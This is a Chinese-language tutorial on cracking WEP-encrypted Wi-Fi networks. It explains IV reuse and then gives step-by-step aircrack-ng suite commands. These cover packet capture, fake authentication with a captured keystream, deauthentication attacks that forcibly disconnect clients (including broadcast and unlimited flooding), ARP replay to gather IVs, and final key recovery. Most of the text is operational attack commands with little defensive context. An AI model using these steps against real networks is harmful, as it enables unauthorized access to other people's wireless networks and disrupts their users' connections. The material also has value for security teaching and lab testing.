
# WEP攻击

* 破解原理

* 流程

* FAKE AUTHENTICATION

* DEAUTHENTICATION攻击

* ARP重放

## 破解原理

1. IV并非完全随机
2. 每224个包可能出现一次IV重用
3. 收集大量IV之后找出相同IV及其对应密文，分析得出共享密码
> ARP回包中包含IV  
只要在IV足够多的情况下，任何复杂程度的WEP密码都可以被破解
（IV量破解和暴力破解）


## 流程
> 启动monitor模式  
  启动抓包并保存抓包  
  Deauthentication抓取XOR文件  
  利用XOR文件与AP建立关联  
  执行ARP重放  
  Deauthentication触发ARP数据包  
  收集足够DATA之后破解密码  
  //利用抓到的keystream加密一个change发给AP，AP用这个keystream解密，确认解开，就可以建立关联。（keystream在.xor结尾的文件里(密文的)）先建立关联才能进行数据包的发收、攻击等。

* 有新用户连接上时
``` 
# 侦听这个AP的BSSID
airdump-ng -c X --bssid XXX -w xxx wlan0mon

# 利用XOR文件与AP建立关联
aireplay-ng -1 60 -e kifi -y keystream.xor -a AP的BSSID -h 自己的MAC地址
    /-1是authentication注入包的攻击方式，60s发一次，目标ESSID，抓取的密钥流，ESSID这个AP的BSSID的MAC，本机的无线MAC地址
    //keystream是密钥流=XOR=change+cifer
    //keystream有新用户连接上时才抓取到change从而计算出keystream。——>效率低



```

* 已经连接的情况
``` 
// Deauthentication抓取XOR文件
aireplay-ng -0 10 -a AP的BSSID -c 已经关联的STA的MAC wlan0mon
    //10次攻击，打击后PWR的值是0
    //Deauthentication是-0注入包的攻击方式（用于打掉已关联的关联AP与STA），基于自动重连，我们就可以抓到数据包
    从而得到keystream
    

```

* 通过上面两个得到keystream后，执行

``` 
# 执行ARP重放
//64位的密钥建议抓到20W以上的IV值，128位是150W以上的IV值。看情况，理论上IV值多越快。
//#Data里面代表IV值数据多少。
aireplay-ng -3 -b AP的MAC -h 本机无线MAC wlan0mon
```

* aircrack-ng XXX.cap

## FAKE AUTHENTICATION

> WEP破解全部需要首先伪造认证，以便与AP进行正常通信


* 不产生ARP数据包
``` 
// 每6000秒发送reauthentication
// -o 1 每次身份认证只发一组认证数据包
// -q 10 每10秒发keep-live帧
aireplay-ng -1 0 -e kifi -a <AP MAC> -h <YOUR MAC> <interface>
aireplay-ng -1 60 -o 1 -q 10 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```


## DEAUTHENTICATION攻击
> 强制客户端与AP断开关联  
      重连生成ARP请求，AP回包包含IV  
      WPA重连过程，过程抓取4步握手过程  
      无客户端情况下此攻击无效  
      
``` 
// 0就是无限发包，直至打掉
// 不指定-c参数时，以广播攻击所有客户端
// 每攻击发送128个包，64个给AP，64个给客户端    
// 物理足够接近被攻击者
aireplay-ng -0 0 -a kifi -c <Client MAC> <interface name>
```      
     
* ARP重放
> 侦听正常的ARP包并重放给AP  
  AP回包中包含大量弱IV——>重复出现
  
``` 
aireplay-ng -3 -b <AP MAC> -h <Source MAC> <interface name>
```
 